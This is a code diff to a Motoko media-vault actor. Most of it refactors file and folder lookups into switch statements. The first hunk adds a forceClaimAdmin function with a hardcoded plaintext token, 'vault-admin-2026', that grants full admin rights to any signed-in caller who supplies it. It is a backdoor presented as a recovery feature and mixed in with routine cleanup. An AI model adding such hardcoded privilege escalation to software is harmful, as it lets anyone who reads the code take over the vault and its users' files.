@@ -59,6 +59,21 @@ actor {
   stable var files = Map.empty<FileId, MediaFile>();
   stable var folders = Map.empty<FolderId, MediaFolder>();
 
+  // Hardcoded recovery token for admin access.
+  // To regain admin access, sign in with Internet Identity and call this with the token below.
+  let ADMIN_RECOVERY_TOKEN : Text = "vault-admin-2026";
+
+  public shared ({ caller }) func forceClaimAdmin(secret : Text) : async Bool {
+    if (caller.isAnonymous()) { return false };
+    if (secret == ADMIN_RECOVERY_TOKEN) {
+      accessControlState.userRoles.add(caller, #admin);
+      accessControlState.adminAssigned := true;
+      return true;
+    } else {
+      return false;
+    };
+  };
+
   // Component Features
 
   // File Operations
@@ -86,16 +101,20 @@ actor {
     if (not (AccessControl.isAdmin(accessControlState, caller))) {
       Runtime.trap("Unauthorized: Only admins can delete files");
     };
-    ignore files.get(id).get(Runtime.trap("File does not exist"));
-    files.remove(id);
+    switch (files.get(id)) {
+      case null { Runtime.trap("File does not exist") };
+      case (?_) { files.remove(id) };
+    };
   };
 
   public shared ({ caller }) func renameFile(id : FileId, newName : Text) : async () {
     if (not (AccessControl.isAdmin(accessControlState, caller))) {
       Runtime.trap("Unauthorized: Only admins can rename files");
     };
-
-    let file = files.get(id).get(Runtime.trap("File does not exist"));
+    let file = switch (files.get(id)) {
+      case (?f) { f };
+      case null { Runtime.trap("File does not exist") };
+    };
     let updatedFile = { file with name = newName };
     files.add(id, updatedFile);
   };
@@ -104,8 +123,10 @@ actor {
     if (not (AccessControl.isAdmin(accessControlState, caller))) {
       Runtime.trap("Unauthorized: Only admins can move files");
     };
-
-    let file = files.get(fileId).get(Runtime.trap("File does not exist"));
+    let file = switch (files.get(fileId)) {
+      case (?f) { f };
+      case null { Runtime.trap("File does not exist") };
+    };
     let updatedFile = { file with folderId };
     files.add(fileId, updatedFile);
   };
@@ -114,8 +135,10 @@ actor {
     if (not (AccessControl.isAdmin(accessControlState, caller))) {
       Runtime.trap("Unauthorized: Only admins can update file tags");
     };
-
-    let file = files.get(id).get(Runtime.trap("File does not exist"));
+    let file = switch (files.get(id)) {
+      case (?f) { f };
+      case null { Runtime.trap("File does not exist") };
+    };
     let updatedFile = { file with tags = newTags };
     files.add(id, updatedFile);
   };
@@ -124,8 +147,10 @@ actor {
     if (not (AccessControl.isAdmin(accessControlState, caller))) {
       Runtime.trap("Unauthorized: Only admins can toggle file visibility");
     };
-
-    let file = files.get(id).get(Runtime.trap("File does not exist"));
+    let file = switch (files.get(id)) {
+      case (?f) { f };
+      case null { Runtime.trap("File does not exist") };
+    };
     let updatedFile = { file with isPublic = not file.isPublic };
     files.add(id, updatedFile);
   };
@@ -150,8 +175,10 @@ actor {
     if (not (AccessControl.isAdmin(accessControlState, caller))) {
       Runtime.trap("Unauthorized: Only admins can rename folders");
     };
-
-    let folder = folders.get(id).get(Runtime.trap("Folder does not exist"));
+    let folder = switch (folders.get(id)) {
+      case (?f) { f };
+      case null { Runtime.trap("Folder does not exist") };
+    };
     let updatedFolder = { folder with name = newName };
     folders.add(id, updatedFolder);
   };
